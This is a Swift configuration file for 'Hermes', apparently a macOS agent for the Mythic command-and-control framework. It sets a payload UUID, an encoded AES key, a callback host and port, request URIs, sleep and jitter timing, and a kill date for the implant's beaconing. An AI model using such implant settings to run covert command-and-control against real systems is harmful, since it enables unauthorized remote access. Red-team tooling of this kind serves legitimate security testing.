//
//  config.swift
//  Hermes
//
//  Created by slyd0g on 5/23/21.
//

import Foundation

struct AgentConfig {
    // Mythic components
    var payloadUUID: String
    var encodedAESKey: String
    
    // C2 components
    var callbackHost: String
    var getRequestURI: String
    var postRequestURI: String
    var callbackPort: Int
    var userAgent: String
    var hostHeader: String
    var useSSL: Bool
    var queryParameter: String
    var httpHeaders: Dictionary<String,String>
    
    // Agent components
    var sleep: Int32
    var jitter: Int32
    var killDate: String //year-month-day, ex. 1994-01-05
}

var agentConfig = AgentConfig(
    payloadUUID: "2ef1aac1-8c77-4ac5-a49c-5b3b50d7a9c5",
    encodedAESKey: "w8j0Y4zDX0tudCO7QouBCpqsec2N+kgep2B3EWRzv5k=",

    callbackHost: "192.168.196.129",
    getRequestURI: "/index",
    postRequestURI: "/data",
    callbackPort: 443,
    userAgent: "Hermes user agent",
    hostHeader: "",
    useSSL: true,
    queryParameter: "q",
    httpHeaders: ["key1":"value1","key2":"value2"],

    sleep: 5,
    jitter: 5,
    killDate: "2022-05-01"
)
